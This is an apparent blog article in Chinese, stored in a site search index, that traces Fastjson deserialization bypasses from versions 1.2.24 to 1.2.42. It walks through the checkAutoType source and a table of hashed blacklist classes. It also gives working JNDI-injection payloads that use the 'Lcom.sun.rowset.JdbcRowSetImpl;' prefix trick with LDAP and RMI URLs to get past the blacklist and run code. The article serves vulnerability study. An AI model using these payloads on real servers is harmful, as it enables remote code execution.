<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Fastjson抗争的一生</title>
    <url>/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>百川东到海，何时复西归？</p>
</blockquote>
<p>这一篇来总结Fastjson不同版本的bypass方式。</p>
<a id="more"></a>

<h1 id="1-2-24漏洞修复"><a href="#1-2-24漏洞修复" class="headerlink" title="1.2.24漏洞修复"></a>1.2.24漏洞修复</h1><p>在1.2.25版本，针对1.2.24版本进行了修复。</p>
<p>我们可以总结以下1.2.24版本的漏洞产生原因：</p>
<ol>
<li><code>@type</code>该关键词的特性会加载任意类，并给提供的输入字段的值进行恢复，如果字段有setter、getter方法会自动调用该方法，进行赋值，恢复出整个类。<br>这个过程会被叫做Fastjson的反序列化过程，注意不要把这个过程跟java反序列化过程混为一谈。它们两个是同等级的存在，而不是前者基于后者之上。也就是说readObject()反序列化利用点那一套在这根本不适用。相应的被屏蔽的type加载任意类+符合条件的setter与getter变成了反序列化利用点。</li>
<li>在找到可以调用的setter、getter之后，从这个可以被触发的setter、getter之后就可以沿着不同的反序列化利用链前进，比如具有一定限制条件的TemplatesImpl利用链，JNDI注入的利用链。</li>
<li>沿着链就会到最后的payload触发点。比如JNDI的远程恶意class文件的实例化操作（构造函数，静态方法）或调用类中getObjectInstance方法，与TemplatesImpl利用链中的class文件字节码的的实例化操作（构造函数，静态方法）。</li>
</ol>
<p>可以注意到最终的payload触发点具有好像是巧合的统一性，都类似于是一个class文件的实例化操作。在commons-collections中则是反射机制（这在被屏蔽的type中的getter、setter函数调用中也被用到）。应该对这两个点产生敏感性。</p>
<p>修复则是针对三要素中的一者进行截断。在1.2.25中的修复原理就是针对了反序列化漏洞触发点进行限制。对于<code>被屏蔽的type</code>标签进行一个白名单+黑名单的限制机制。</p>
<p>使用万能的idea对两个版本的jar包进行对比：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/20200102094428-69e0459c-2d01-1.jpg" alt="img"></p>
<p>可以注意到，在解析json串的<code>DefaultJSONParser类</code>中做了一行代码的修改。当输入的键值是<code>@type</code>时，原本直接对值对应的类进行加载。现在会将值ref传入<code>checkAutoType方法</code>中。</p>
<p>checkAutoType是1.2.25版本中新增的一个白名单+黑名单机制。同时引入一个配置参数<code>AutoTypeSupport</code>。参考<a href="https://github.com/alibaba/fastjson/wiki/enable_autotype" target="_blank" rel="noopener">官方wiki</a></p>
<p>Fastjson默认AutoTypeSupport为False（开启白名单机制），通过需要服务端通过以下代码来显性修改：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>); （关闭白名单机制）</span><br></pre></td></tr></table></figure>

<p>可见，False为禁止自动转换，true为允许自动转换。</p>
<p>由于checkAutoType中两条路线的代码是穿插的，先来看默认<code>AutoTypeSupport</code>为False时的代码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">        <span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> String className = typeName.replace(<span class="string">'$'</span>, <span class="string">'.'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//一些固定类型的判断，此处不会对clazz进行赋值，此处省略</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">            <span class="comment">//进行黑名单匹配，匹配中，直接报错退出</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">                String deny = denyList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//对白名单，进行匹配；如果匹配中，调用loadClass加载，赋值clazz直接返回</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">                String accept = acceptList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//此处省略了当clazz不为null时的处理情况，与expectClass有关</span></span><br><span class="line">        <span class="comment">//但是我们这里输入固定是null，不执行此处代码</span></span><br><span class="line">        <span class="comment">//可以发现如果上面没有触发黑名单，返回，也没有触发白名单匹配中的话，就会在此处被拦截报错返回。</span></span><br><span class="line">        <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//执行不到此处</span></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大体流程就是先过黑名单，再过白名单，要是都不适配，最后也会报错。</p>
<p>可以得出在默认的<code>AutoTypeSupport为False</code>时，要求不匹配到黑名单，同时必须匹配到白名单的class才可以成功加载。</p>
<p>看一下默认黑名单，默认白名单（最下面，默认为空）</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/20200102094428-6a060516-2d01-1.jpg" alt="img"></p>
<p>这条路完全被白名单堵死了,所以默认的情况下是不可能绕过的。我们的两个payload也都被com.sun这一条黑名单给匹配了。</p>
<h1 id="1-2-25-1-2-41绕过"><a href="#1-2-25-1-2-41绕过" class="headerlink" title="1.2.25-1.2.41绕过"></a>1.2.25-1.2.41绕过</h1><p>所以接下来所谓的绕过都是在服务端显性开启<code>AutoTypeSupport为True</code>的情况下进行的。（这是一个很大的限制条件）</p>
<p>我们先来看显性修改<code>AutoTypeSupport为True</code>时的代码：</p>
<p>1.2.25版本com.alibaba.fastjson.parser.ParserConfig#checkAutoType(关闭白名单机制) 也就是true。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">        <span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> String className = typeName.replace(<span class="string">'$'</span>, <span class="string">'.'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">//先进行白名单匹配，如果匹配成功则直接返回。可见所谓的关闭白名单机制是不只限于白名单</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">                String accept = acceptList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">           <span class="comment">//同样进行黑名单匹配，如果匹配成功，则报错推出。</span></span><br><span class="line">            <span class="comment">//需要注意这百年所谓的匹配都是startsWith开头匹配</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">                String deny = denyList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//一些固定类型的判断，不会对clazz进行赋值，此处省略</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//不匹配白名单中也不匹配黑名单的，进入此处，进行class加载</span></span><br><span class="line">        <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">            clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//对于加载的类进行危险性判断，判断加载的clazz是否继承自Classloader与DataSource</span></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ClassLoader<span class="class">.<span class="keyword">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>) // <span class="title">classloader</span> <span class="title">is</span> <span class="title">danger</span></span></span><br><span class="line"><span class="class">                    || <span class="title">DataSource</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>) // <span class="title">dataSource</span> <span class="title">can</span> <span class="title">load</span> <span class="title">jdbc</span> <span class="title">driver</span></span></span><br><span class="line"><span class="class">                    ) </span>&#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//返回加载的class</span></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可见在显性关闭白名单的情况下，也需要绕过黑名单检测，同时加载的类不能继承自Classloader与DataSource。</p>
<p>看似只能找到其他的利用类跟黑名单进行硬刚。但再跟一下类的加载<code>TypeUtils.loadClass</code>就会有所发现。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">        <span class="keyword">if</span> (className == <span class="keyword">null</span> || className.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> clazz;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//特殊处理1！</span></span><br><span class="line">        <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">'['</span>) &#123;</span><br><span class="line">            Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">            <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//特殊处理2！</span></span><br><span class="line">        <span class="keyword">if</span> (className.startsWith(<span class="string">"L"</span>) &amp;&amp; className.endsWith(<span class="string">";"</span>)) &#123;</span><br><span class="line">            String newClassName = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">        &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<ul>
<li><p>如果这个className是以<code>[</code>开头我们会去掉<code>[</code>进行加载！</p>
<p>但是实际上在代码中也可以看见它会返回Array的实例变成数组。在实际中它远远不会执行到这一步，在json串解析时就已经报错。</p>
</li>
<li><p>如果这个className是以<code>L</code>开头<code>;</code>结尾，就会去掉开头和结尾进行加载！</p>
</li>
</ul>
<p>那么加上<code>L</code>开头<code>;</code>结尾实际上就可以绕过所有黑名单。那么理所当然的payload就为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LDAP：</span><br><span class="line">String payload = <span class="string">"&#123;\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\", \"autoCommit\":true&#125;"</span>;</span><br><span class="line"></span><br><span class="line">RMI：</span><br><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"Lcom.sun.rowset.RowSetImpl;"</span>,<span class="string">"dataSourceName"</span>:<span class="string">"rmi://localhost:1099/Exploit"</span>,<span class="string">"autoCommit"</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>关键PoC为：<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>/<code>Lcom.sun.rowset.RowSetImpl;</code></p>
<p>注意是要开启AutoTypeSupport的，添加以下代码就ok了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br></pre></td></tr></table></figure>

<p>直接运行即可绕过checkAutoType()黑名单实现弹计算器：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706121236438.png" alt="image-20200706121236438"></p>
<h2 id="绕过分析"><a href="#绕过分析" class="headerlink" title="绕过分析"></a>绕过分析</h2><p>我们注意到，PoC和之前的不同之处在于在”com.sun.rowset.JdbcRowSetImpl”类名的前面加了”L”、后面加了”;”就绕过了黑名单过滤。</p>
<p>下面我们调试分析看看为啥会绕过。</p>
<p>我们将断点打在checkAutoType()函数上，调试跟进去，”Lcom.sun.rowset.JdbcRowSetImpl;”类名由于是以”L”开头，因此并不在denyList黑名单中，从而绕过了黑名单校验:</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706124435820.png" alt="image-20200706124435820"></p>
<p>再往下开始调用TypeUtils.loadClass()：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/3.png" alt="img"></p>
<p>跟进TypeUtils.loadClass()函数，这里我们在之前的文章中年已经调试分析过了，也提示过了，就是会有个判断条件判断类名是否以”L”开头、以”;”结尾，是的话就提取出其中的类名再加载进来，因此能成功绕过：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706125048392.png" alt="image-20200706125048392"></p>
<h1 id="1-2-42-漏洞修复"><a href="#1-2-42-漏洞修复" class="headerlink" title="1.2.42 漏洞修复"></a>1.2.42 漏洞修复</h1><p>自1.2.42版本开始，在ParserConfig.java中可以看到黑名单改为了哈希黑名单：</p>
<p><img src="../images/Fastjson%E6%8A%97%E4%BA%89%E7%9A%84%E4%B8%80%E7%94%9F/image-20200706125426393.png" alt="image-20200706125426393"></p>
<p>从1.2.42版本开始，Fastjson把原本明文形式的黑名单改成了哈希过的黑名单，目的就是为了防止安全研究者对其进行研究，提高漏洞利用门槛，但是有人已在Github上跑出了大部分黑名单包类：<a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener">https://github.com/LeadroyaL/fastjson-blacklist</a></p>
<p>目前已知的哈希黑名单的对应表如下：</p>
<table>
<thead>
<tr>
<th>version</th>
<th>hash</th>
<th>hex-hash</th>
<th>name</th>
</tr>
</thead>
<tbody><tr>
<td>1.2.42</td>
<td>-8720046426850100497</td>
<td>0x86fc2bf9beaf7aefL</td>
<td>org.apache.commons.collections4.comparators</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-8109300701639721088</td>
<td>0x8f75f9fa0df03f80L</td>
<td>org.python.core</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-7966123100503199569</td>
<td>0x9172a53f157930afL</td>
<td>org.apache.tomcat</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-7766605818834748097</td>
<td>0x9437792831df7d3fL</td>
<td>org.apache.xalan</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-6835437086156813536</td>
<td>0xa123a62f93178b20L</td>
<td>javax.xml</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-4837536971810737970</td>
<td>0xbcdd9dc12766f0ceL</td>
<td>org.springframework.</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-4082057040235125754</td>
<td>0xc7599ebfe3e72406L</td>
<td>org.apache.commons.beanutils</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-2364987994247679115</td>
<td>0xdf2ddff310cdb375L</td>
<td>org.apache.commons.collections.Transformer</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-1872417015366588117</td>
<td>0xe603d6a51fad692bL</td>
<td>org.codehaus.groovy.runtime</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-254670111376247151</td>
<td>0xfc773ae20c827691L</td>
<td>java.lang.Thread</td>
</tr>
<tr>
<td>1.2.42</td>
<td>-190281065685395680</td>
<td>0xfd5bfc610056d720L</td>
<td>javax.net.</td>
</tr>
<tr>
<td>1.2.42</td>
<td>313864100207897507</td>
<td>0x45b11bc78a3aba3L</td>
<td>com.mchange</td>
</tr>
<tr>
<td>1.2.42</td>
<td>1203232727967308606</td>
<td>0x10b2bdca849d9b3eL</td>
<td>org.apache.wicket.util</td>
</tr>
<tr>
<td>1.2.42</td>
<td>1502845958873959152</td>
<td>0x14db2e6fead04af0L</td>
<td>java.util.jar.</td>
</tr>
<tr>
<td>1.2.42</td>
<td>3547627781654598988</td>
<td>0x313bb4abd8d4554cL</td>
<td>org.mozilla.javascript</td>
</tr>
<tr>
<td>1.2.42</td>
<td>3730752432285826863</td>
<td>0x33c64b921f523f2fL</td>
<td>java.rmi</td>
</tr>
<tr>
<td>1.2.42</td>
<td>3794316665763266033</td>
<td>0x34a81ee78429fdf1L</td>
<td>java.util.prefs.</td>
</tr>
<tr>
<td>1.2.42</td>
<td>4147696707147271408</td>
<td>0x398f942e01920cf0L</td>
<td>com.sun.</td>
</tr>
<tr>
<td>1.2.42</td>
<td>5347909877633654828</td>
<td>0x4a3797b30328202cL</td>
<td>java.util.logging.</td>
</tr>
<tr>
<td>1.2.42</td>
<td>5450448828334921485</td>
<td>0x4ba3e254e758d70dL</td>
<td>org.apache.bcel</td>
</tr>
<tr>
<td>1.2.42</td>
<td>5751393439502795295</td>
<td>0x4fd10ddc6d13821fL</td>
<td>java.net.Socket</td>
</tr>
<tr>
<td>1.2.42</td>
<td>5944107969236155580</td>
<td>0x527db6b46ce3bcbcL</td>
<td>org.apache.commons.fileupload</td>
</tr>
<tr>
<td>1.2.42</td>
<td>6742705432718011780</td>
<td>0x5d92e6ddde40ed84L</td>
<td>org.jboss</td>
</tr>
<tr>
<td>1.2.42</td>
<td>7179336928365889465</td>
<td>0x63a220e60a17c7b9L</td>
<td>org.hibernate</td>
</tr>
<tr>
<td>1.2.42</td>
<td>7442624256860549330</td>
<td>0x6749835432e0f0d2L</td>
<td>org.apache.commons.collections.functors</td>
</tr>
<tr>
<td>1.2.42</td>
<td>8838294710098435315</td>
<td>0x7aa7ee3627a19cf3L</td>
<td>org.apache.myfaces.context.servlet</td>
</tr>
<tr>
<td>1.2.43</td>
<td>-2262244760619952081</td>
<td>0xe09ae4604842582fL</td>
<td>java.net.URL</td>
</tr>
<tr>
<td>1.2.46</td>
<td>-8165637398350707645</td>
<td>0x8eadd40cb2a94443L</td>
<td>junit.</td>
</tr>
<tr>
<td>1.2.46</td>
<td>-8083514888460375884</td>
<td>0x8fd1960988bce8b4L</td>
<td>org.apache.ibatis.datasource</td>
</tr>
<tr>
<td>1.2.46</td>
<td>-7921218830998286408</td>
<td>0x92122d710e364fb8L</td>
<td>org.osjava.sj.</td>
</tr>
<tr>
<td>1.2.46</td>
<td>-7768608037458185275</td>
<td>0x94305c26580f73c5L</td>
<td>org.apache.log4j.</td>
</tr>
<tr>
<td>1.2.46</td>
<td>-6179589609550493385</td>
<td>0xaa3daffdb10c4937L</td>
<td>org.logicalcobwebs.</td>
</tr>
<tr>
<td>1.2.46</td>
<td>-5194641081268104286</td>
<td>0xb7e8ed757f5d13a2L</td>
<td>org.apache.logging.</td>
</tr>
<tr>
<td>1.2.46</td>
<td>-3935185854875733362</td>
<td>0xc963695082fd728eL</td>
<td>org.apache.commons.dbcp</td>
</tr>
<tr>
<td>1.2.46</td>
<td>-2753427844400776271</td>
<td>0xd9c9dbf6bbd27bb1L</td>
<td>com.ibatis.sqlmap.engine.datasource</td>
</tr>
<tr>
<td>1.2.46</td>
<td>-1589194880214235129</td>
<td>0xe9f20bad25f60807L</td>
<td>org.jdom.</td>
</tr>
<tr>
<td>1.2.46</td>
<td>1073634739308289776</td>
<td>0xee6511b66fd5ef0L</td>
<td>org.slf4j.</td>
</tr>
<tr>
<td>1.2.46</td>
<td>5688200883751798389</td>
<td>0x4ef08c90ff16c675L</td>
<td>javassist.</td>
</tr>
<tr>
<td>1.2.46</td>
<td>7017492163108594270</td>
<td>0x616323f12c2ce25eL</td>
<td>oracle.net</td>
</tr>
<tr>
<td>1.2.46</td>
<td>8389032537095247355</td>
<td>0x746bd4a53ec195fbL</td>
<td>org.jaxen.</td>
</tr>
<tr>
<td>1.2.48</td>
<td>1459860845934817624</td>
<td>0x144277b467723158L</td>
<td>java.net.InetAddress</td>
</tr>
<tr>
<td>1.2.48</td>
<td>8409640769019589119</td>
<td>0x74b50bb9260e31ffL</td>
<td>java.lang.Class</td>
</tr>
<tr>
<td>1.2.49</td>
<td>4904007817188630457</td>
<td>0x440e89208f445fb9L</td>
<td>com.alibaba.fastjson.annotation</td>
</tr>
<tr>
<td>1.2.59</td>
<td>5100336081510080343</td>
<td>0x46c808a4b5841f57L</td>
<td>org.apache.cxf.jaxrs.provider.</td>
</tr>
<tr>
<td>1.2.59</td>
<td>6456855723474196908</td>
<td>0x599b5c1213a099acL</td>
<td>ch.qos.logback.</td>
</tr>
<tr>
<td>1.2.59</td>
<td>8537233257283452655</td>
<td>0x767a586a5107feefL</td>
<td>net.sf.ehcache.transaction.manager.</td>
</tr>
<tr>
<td>1.2.60</td>
<td>3688179072722109200</td>
<td>0x332f0b5369a18310L</td>
<td>com.zaxxer.hikari.</td>
</tr>
<tr>
<td>1.2.61</td>
<td>-4401390804044377335</td>
<td>0xc2eb1e621f439309L</td>
<td>flex.messaging.util.concurrent.AsynchBeansWorkManagerExecutor</td>
</tr>
<tr>
<td>1.2.61</td>
<td>-1650485814983027158</td>
<td>0xe9184be55b1d962aL</td>
<td>org.apache.openjpa.ee.</td>
</tr>
<tr>
<td>1.2.61</td>
<td>-1251419154176620831</td>
<td>0xeea210e8da2ec6e1L</td>
<td>oracle.jdbc.rowset.OracleJDBCRowSet</td>
</tr>
<tr>
<td>1.2.61</td>
<td>-9822483067882491</td>
<td>0xffdd1a80f1ed3405L</td>
<td>com.mysql.cj.jdbc.admin.</td>
</tr>
<tr>
<td>1.2.61</td>
<td>99147092142056280</td>
<td>0x1603dc147a3e358L</td>
<td>oracle.jdbc.connector.OracleManagedConnectionFactory</td>
</tr>
<tr>
<td>1.2.61</td>
<td>3114862868117605599</td>
<td>0x2b3a37467a344cdfL</td>
<td>org.apache.ibatis.parsing.</td>
</tr>
<tr>
<td>1.2.61</td>
<td>4814658433570175913</td>
<td>0x42d11a560fc9fba9L</td>
<td>org.apache.axis2.jaxws.spi.handler.</td>
</tr>
<tr>
<td>1.2.61</td>
<td>6511035576063254270</td>
<td>0x5a5bd85c072e5efeL</td>
<td>jodd.db.connection.</td>
</tr>
<tr>
<td>1.2.61</td>
<td>8925522461579647174</td>
<td>0x7bddd363ad3998c6L</td>
<td>org.apache.commons.configuration.JNDIConfiguration</td>
</tr>
<tr>
<td>1.2.62</td>
<td>-9164606388214699518</td>
<td>0x80d0c70bcc2fea02L</td>
<td>org.apache.ibatis.executor.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>-8649961213709896794</td>
<td>0x87f52a1b07ea33a6L</td>
<td>net.sf.cglib.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>-5764804792063216819</td>
<td>0xafff4c95b99a334dL</td>
<td>com.mysql.cj.jdbc.MysqlDataSource</td>
</tr>
<tr>
<td>1.2.62</td>
<td>-4438775680185074100</td>
<td>0xc2664d0958ecfe4cL</td>
<td>aj.org.objectweb.asm.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>-3319207949486691020</td>
<td>0xd1efcdf4b3316d34L</td>
<td>oracle.jdbc.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>-2192804397019347313</td>
<td>0xe1919804d5bf468fL</td>
<td>org.apache.commons.collections.comparators.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>-2095516571388852610</td>
<td>0xe2eb3ac7e56c467eL</td>
<td>net.sf.ehcache.hibernate.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>4750336058574309</td>
<td>0x10e067cd55c5e5L</td>
<td>com.mysql.cj.log.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>218512992947536312</td>
<td>0x3085068cb7201b8L</td>
<td>org.h2.jdbcx.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>823641066473609950</td>
<td>0xb6e292fa5955adeL</td>
<td>org.apache.commons.logging.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>1534439610567445754</td>
<td>0x154b6cb22d294cfaL</td>
<td>org.apache.ibatis.reflection.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>1818089308493370394</td>
<td>0x193b2697eaaed41aL</td>
<td>org.h2.server.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>2164696723069287854</td>
<td>0x1e0a8c3358ff3daeL</td>
<td>org.apache.ibatis.datasource.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>2653453629929770569</td>
<td>0x24d2f6048fef4e49L</td>
<td>org.objectweb.asm.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>2836431254737891113</td>
<td>0x275d0732b877af29L</td>
<td>flex.messaging.util.concurrent.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>3089451460101527857</td>
<td>0x2adfefbbfe29d931L</td>
<td>org.apache.ibatis.javassist.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>3718352661124136681</td>
<td>0x339a3e0b6beebee9L</td>
<td>org.apache.ibatis.ognl.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>4046190361520671643</td>
<td>0x3826f4b2380c8b9bL</td>
<td>com.mysql.cj.jdbc.MysqlConnectionPoolDataSource</td>
</tr>
<tr>
<td>1.2.62</td>
<td>6280357960959217660</td>
<td>0x5728504a6d454ffcL</td>
<td>org.apache.ibatis.scripting.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>6734240326434096246</td>
<td>0x5d74d3e5b9370476L</td>
<td>com.mysql.cj.jdbc.MysqlXADataSource</td>
</tr>
<tr>
<td>1.2.62</td>
<td>7123326897294507060</td>
<td>0x62db241274397c34L</td>
<td>org.apache.commons.collections.functors.</td>
</tr>
<tr>
<td>1.2.62</td>
<td>8488266005336625107</td>
<td>0x75cc60f5871d0fd3L</td>
<td>org.apache.commons.configuration</td>
</tr>
</tbody></table>
<p>目前未知的哈希黑名单：</p>
<table>
<thead>
<tr>
<th>version</th>
<th>hash</th>
<th>hex-hash</th>
<th>name</th>
</tr>
</thead>
<tbody><tr>
<td>1.2.42</td>
<td>33238344207745342</td>
<td>0x761619136cc13eL</td>
<td></td>
</tr>
<tr>
<td>1.2.62</td>
<td>-6316154655839304624</td>
<td>0xa85882ce1044c450L</td>
<td></td>
</tr>
<tr>
<td>1.2.62</td>
<td>-5472097725414717105</td>
<td>0xb40f341c746ec94fL</td>
<td></td>
</tr>
<tr>
<td>1.2.62</td>
<td>-4608341446948126581</td>
<td>0xc00be1debaf2808bL</td>
<td></td>
</tr>
<tr>
<td>1.2.62</td>
<td>3256258368248066264</td>
<td>0x2d308dbbc851b0d8L</td>
<td></td>
</tr>
<tr>
<td>1.2.62</td>
<td>4841947709850912914</td>
<td>0x43320dc9d2ae0892L</td>
<td></td>
</tr>
<tr>
<td>1.2.62</td>
<td>6534946468240507089</td>
<td>0x5ab0cb3071ab40d1L</td>
<td></td>
</tr>
</tbody></table>
<p>关键是在<code>ParserConfig.java</code>中修改了以下两点：</p>
<ol>
<li>修改明文黑名单为黑名单hash</li>
<li>对于传入的类名，删除开头<code>L</code>和结尾的<code>;</code></li>
</ol>
